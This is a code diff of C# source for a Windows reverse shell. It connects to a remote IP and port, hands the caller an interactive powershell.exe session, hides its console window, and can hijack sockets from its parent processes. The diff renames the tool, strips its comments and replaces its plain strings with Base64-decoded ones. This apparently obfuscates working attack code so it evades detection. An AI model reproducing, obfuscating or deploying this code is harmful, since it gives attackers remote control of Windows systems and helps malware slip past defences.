@@ -1345,7 +1290,6 @@ public static class NotYouShell
             byte[] bytesReceived = new byte[bufferSize];
             WSAWaitForMultipleEvents(wsaEventsArray.Length, wsaEventsArray, true, 500, false);
             nBytesReceived = recv(shellSocket, bytesReceived, bufferSize, 0);
-            // we still check WSAEWOULDBLOCK for a more robust implementation
             if (WSAGetLastError() == WSAEWOULDBLOCK)
             {
                 socketBlockingOperation = true;
@@ -1353,9 +1297,7 @@ public static class NotYouShell
             }
             WSAResetEvent(wsaReadEvent);
             socketBlockingOperation = false;
-            // Console.WriteLine("debug: ThreadReadSocketWritePipe recv: nBytesReceived = " + nBytesReceived + " WSAGetLastError() = " + WSAGetLastError().ToString());
             writeSuccess = WriteFile(InputPipeWrite, bytesReceived, (uint)nBytesReceived, out bytesWritten, IntPtr.Zero);
-            // Console.WriteLine("debug ThreadReadSocketWritePipe WriteFile: bytesWritten = " + bytesWritten + " Marshal.GetLastWin32Error() = " + Marshal.GetLastWin32Error());
         } while (socketBlockingOperation || (nBytesReceived > 0 && writeSuccess));
         WSACloseEvent(wsaReadEvent);
         TerminateProcess(hChildProcess, 0);
@@ -1376,7 +1318,7 @@ public static class NotYouShell
         return thReadSocketWritePipe;
     }
 
-    public static string SpawnNotYouShell(string remoteIp, int remotePort, uint rows, uint cols, string commandLine, bool upgradeShell)
+    public static string SpawnErfaBilbilack(string remoteIp, int remotePort, uint rows, uint cols, string commandLine, bool upgradeShell)
     {
         IntPtr shellSocket = IntPtr.Zero;
         IntPtr InputPipeRead = IntPtr.Zero;
@@ -1390,42 +1332,37 @@ public static class NotYouShell
         bool newConsoleAllocated = false;
         bool parentSocketInherited = false;
         bool grandParentSocketInherited = false;
-        bool NotYouCompatible = false;
+        bool ERFANCompatible = false;
         bool IsSocketOverlapped = true;
         string output = "";
         Process currentProcess = null;
         Process parentProcess = null;
         Process grandParentProcess = null;
-        if (GetProcAddress(GetModuleHandle("kernel32"), "CreatePseudoConsole") != IntPtr.Zero)
-            NotYouCompatible = true;
+        if (GetProcAddress(GetModuleHandle(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI="))), Encoding.UTF8.GetString(Convert.FromBase64String("Q3JlYXRlUHNldWRvQ29uc29sZQ=="))) != IntPtr.Zero)
+            ERFANCompatible = true;
         PROCESS_INFORMATION childProcessInfo = new PROCESS_INFORMATION();
         CreatePipes(ref InputPipeRead, ref InputPipeWrite, ref OutputPipeRead, ref OutputPipeWrite);
-        // comment the below function to debug errors
         InitConsole(ref oldStdIn, ref oldStdOut, ref oldStdErr);
-        // init wsastartup stuff for this thread
         InitWSAThread();
-        if (NotYouCompatible)
+        if (ERFANCompatible)
         {
-            Console.WriteLine("\r\nCreatePseudoConsole function found! Spawning a fully interactive shell\r\n");
+            Console.WriteLine(Encoding.UTF8.GetString(Convert.FromBase64String("XHJcbkNyZWF0ZVBzZXVkb0NvbnNvbGUgZnVuY3Rpb24gZm91bmQhIFNwYXduaW5nIGEgZnVsbHkgaW50ZXJhY3RpdmUgc2hlbGxcclxu")));
             if (upgradeShell)
             {
                 List<IntPtr> socketsHandles = new List<IntPtr>();
                 currentProcess = Process.GetCurrentProcess();
                 parentProcess = ParentProcessUtilities.GetParentProcess(currentProcess.Handle);
                 if (parentProcess != null) grandParentProcess = ParentProcessUtilities.GetParentProcess(parentProcess.Handle);
-                // try to duplicate the socket for the current process
                 shellSocket = SocketHijacking.DuplicateTargetProcessSocket(currentProcess, ref IsSocketOverlapped);
                 if (shellSocket == IntPtr.Zero && parentProcess != null)
                 {
-                    // if no sockets are found in the current process we try to hijack our current parent process socket
                     shellSocket = SocketHijacking.DuplicateTargetProcessSocket(parentProcess, ref IsSocketOverlapped);
                     if (shellSocket == IntPtr.Zero && grandParentProcess != null)
                     {
-                        // damn, even the parent process has no usable sockets, let's try a last desperate attempt in the grandparent process
                         shellSocket = SocketHijacking.DuplicateTargetProcessSocket(grandParentProcess, ref IsSocketOverlapped);
                         if (shellSocket == IntPtr.Zero)
                         {
-                            throw new NotYouShellException("No \\Device\\Afd objects found. Socket duplication failed.");
+                            throw new ErfaBilbilackException(Encoding.UTF8.GetString(Convert.FromBase64String("Tm8gXFxEZXZpY2VcXEFmZCBvYmplY3RzIGZvdW5kLiBTb2NrZXQgZHVwbGljYXRpb24gZmFpbGVkLg==")));
                         }
                         else
                         {
@@ -1434,14 +1371,12 @@ public static class NotYouShell
                     }
                     else
                     {
-                        // gotcha a usable socket from the parent process, let's see if the grandParent also use the socket
                         parentSocketInherited = true;
                         if (grandParentProcess != null) grandParentSocketInherited = SocketHijacking.IsSocketInherited(shellSocket, grandParentProcess);
                     }
                 }
                 else
                 {
-                    // the current process got a usable socket, let's see if the parents use the socket
                     if (parentProcess != null) parentSocketInherited = SocketHijacking.IsSocketInherited(shellSocket, parentProcess);
                     if (grandParentProcess != null) grandParentSocketInherited = SocketHijacking.IsSocketInherited(shellSocket, grandParentProcess);
                 }
@@ -1462,10 +1397,6 @@ public static class NotYouShell
                 ShowWindow(GetConsoleWindow(), SW_HIDE);
                 newConsoleAllocated = true;
             }
-            // debug code for checking handle duplication
-            // Console.WriteLine("debug: Creating pseudo console...");
-            // Thread.Sleep(180000);
-            // return "";
             int pseudoConsoleCreationResult = CreatePseudoConsoleWithPipes(ref handlePseudoConsole, ref InputPipeRead, ref OutputPipeWrite, rows, cols);
             if (pseudoConsoleCreationResult != 0)
             {
@@ -1478,7 +1409,7 @@ public static class NotYouShell
         {
             if (upgradeShell)
             {
-                output += string.Format("Could not upgrade shell to fully interactive because NotYou is not compatible on this system");
+                output += string.Format("Could not upgrade shell to fully interactive because ERFAN is not compatible on this system");
                 return output;
             }
             shellSocket = connectRemote(remoteIp, remotePort);
@@ -1487,7 +1418,7 @@ public static class NotYouShell
                 output += string.Format("{0}Could not connect to ip {1} on port {2}", errorString, remoteIp, remotePort.ToString());
                 return output;
             }
-            Console.WriteLine("\r\nCreatePseudoConsole function not found! Spawning a netcat-like interactive shell...\r\n");
+            Console.WriteLine(Encoding.UTF8.GetString(Convert.FromBase64String("XHJcbkNyZWF0ZVBzZXVkb0NvbnNvbGUgZnVuY3Rpb24gbm90IGZvdW5kISBTcGF3bmluZyBhIG5ldGNhdC1saWtlIGludGVyYWN0aXZlIHNoZWxsLi4uXHJcbg==")));
             STARTUPINFO sInfo = new STARTUPINFO();
             sInfo.cb = Marshal.SizeOf(sInfo);
             sInfo.dwFlags |= (Int32)STARTF_USESTDHANDLES;
@@ -1496,30 +1427,22 @@ public static class NotYouShell
             sInfo.hStdError = OutputPipeWrite;
             CreateProcess(null, commandLine, IntPtr.Zero, IntPtr.Zero, true, 0, IntPtr.Zero, null, ref sInfo, out childProcessInfo);
         }
-        // Note: We can close the handles to the PTY-end of the pipes here
-        // because the handles are dup'ed into the ConHost and will be released
-        // when the NotYou is destroyed.
         if (InputPipeRead != IntPtr.Zero) CloseHandle(InputPipeRead);
         if (OutputPipeWrite != IntPtr.Zero) CloseHandle(OutputPipeWrite);
         if (upgradeShell) {
-            // we need to suspend other processes that can interact with the duplicated sockets if any. This will ensure stdin, stdout and stderr is read/write only by our NotYou process
             if (parentSocketInherited) NtSuspendProcess(parentProcess.Handle);
             if (grandParentSocketInherited) NtSuspendProcess(grandParentProcess.Handle);
             if (!IsSocketOverlapped) SocketHijacking.SetSocketBlockingMode(shellSocket, 1);
         }
-        //Threads have better performance than Tasks
         Thread thThreadReadPipeWriteSocket = StartThreadReadPipeWriteSocket(OutputPipeRead, shellSocket, IsSocketOverlapped);
         Thread thReadSocketWritePipe = StartThreadReadSocketWritePipe(InputPipeWrite, shellSocket, childProcessInfo.hProcess, IsSocketOverlapped);
-        // wait for the child process until exit
         WaitForSingleObject(childProcessInfo.hProcess, INFINITE);
-        //cleanup everything
         thThreadReadPipeWriteSocket.Abort();
         thReadSocketWritePipe.Abort();
         if (upgradeShell)
         {
             if (!IsSocketOverlapped)
             {
-                // cancelling the event selection for the socket
                 WSAEventSelect(shellSocket, IntPtr.Zero, 0);
                 SocketHijacking.SetSocketBlockingMode(shellSocket, 0);
             }
@@ -1535,24 +1458,24 @@ public static class NotYouShell
         if (handlePseudoConsole != IntPtr.Zero) ClosePseudoConsole(handlePseudoConsole);
         if (InputPipeWrite != IntPtr.Zero) CloseHandle(InputPipeWrite);
         if (OutputPipeRead != IntPtr.Zero) CloseHandle(OutputPipeRead);
-        output += "NotYouShell kindly exited.\r\n";
+        output += Encoding.UTF8.GetString(Convert.FromBase64String("RXJmYUJpbGJpbGFjayBraW5kbHkgZXhpdGVkLlxyXG4="));
         return output;
     }
 }
 
-public static class NotYouShellMainClass
+public static class ErfaBilbilackMainClass
 {
     private static string help = @"";
 
     private static bool HelpRequired(string param)
     {
-        return param == "-h" || param == "--help" || param == "/?";
+        return param == "-h" || param == Encoding.UTF8.GetString(Convert.FromBase64String("LS1oZWxw")) || param == "/?";
     }
 
     private static void CheckArgs(string[] arguments)
     {
         if (arguments.Length < 2)
-            throw new NotYouShellException("\r\nNotYouShell: Not enough arguments. 2 Arguments required. Use --help for additional help.\r\n");
+            throw new ErfaBilbilackException(Encoding.UTF8.GetString(Convert.FromBase64String("XHJcbkVyZmFCaWxiaWxhY2s6IE5vdCBlbm91Z2ggYXJndW1lbnRzLiAyIEFyZ3VtZW50cyByZXF1aXJlZC4gVXNlIC0taGVscCBmb3IgYWRkaXRpb25hbCBoZWxwLlxyXG4=")));
     }
 
     private static void DisplayHelp()
@@ -1564,7 +1487,7 @@ public static class NotYouShellMainClass
     {
         IPAddress address;
         if (!IPAddress.TryParse(ipString, out address))
-            throw new NotYouShellException("\r\nNotYouShell: Invalid remoteIp value" + ipString);
+            throw new ErfaBilbilackException(Encoding.UTF8.GetString(Convert.FromBase64String("XHJcbkVyZmFCaWxiaWxhY2s6IEludmFsaWQgcmVtb3RlSXAgdmFsdWU=")) + ipString);
         return ipString;
     }
 
@@ -1572,7 +1495,7 @@ public static class NotYouShellMainClass
     {
         int ret = 0;
         if (!Int32.TryParse(arg, out ret))
-            throw new NotYouShellException("\r\nNotYouShell: Invalid integer value " + arg);
+            throw new ErfaBilbilackException(Encoding.UTF8.GetString(Convert.FromBase64String("XHJcbkVyZmFCaWxiaWxhY2s6IEludmFsaWQgaW50ZWdlciB2YWx1ZSA=")) + arg);
         return ret;
     }
 
@@ -1594,13 +1517,13 @@ public static class NotYouShellMainClass
 
     private static string ParseCommandLine(string[] arguments)
     {
-        string commandLine = "powershell.exe";
+        string commandLine = Encoding.UTF8.GetString(Convert.FromBase64String("cG93ZXJzaGVsbC5leGU="));
         if (arguments.Length > 4)
             commandLine = arguments[4];
         return commandLine;
     }
 
-    public static string NotYouShellMain(string[] args)
+    public static string ErfaBilbilackMain(string[] args)
     {
         string output = "";
         if (args.Length == 1 && HelpRequired(args[0]))
@@ -1615,7 +1538,7 @@ public static class NotYouShellMainClass
             try
             {
                 CheckArgs(args);
-                if (args[0].Contains("upgrade"))
+                if (args[0].Contains(Encoding.UTF8.GetString(Convert.FromBase64String("dXBncmFkZQ=="))))
                     upgradeShell = true;
                 else
                 {
@@ -1625,7 +1548,7 @@ public static class NotYouShellMainClass
                 uint rows = ParseRows(args);
                 uint cols = ParseCols(args);
                 string commandLine = ParseCommandLine(args);
-                output = NotYouShell.SpawnNotYouShell(remoteIp, remotePort, rows, cols, commandLine, upgradeShell);
+                output = ErfaBilbilack.SpawnErfaBilbilack(remoteIp, remotePort, rows, cols, commandLine, upgradeShell);
             }
             catch (Exception e)
             {
@@ -1641,8 +1564,7 @@ class MainClass
 {
     static void Main(string[] args)
     {
-        Console.Out.Write(NotYouShellMainClass.NotYouShellMain(args));
+        Console.Out.Write(ErfaBilbilackMainClass.ErfaBilbilackMain(args));
     }
 }
-
 "@;
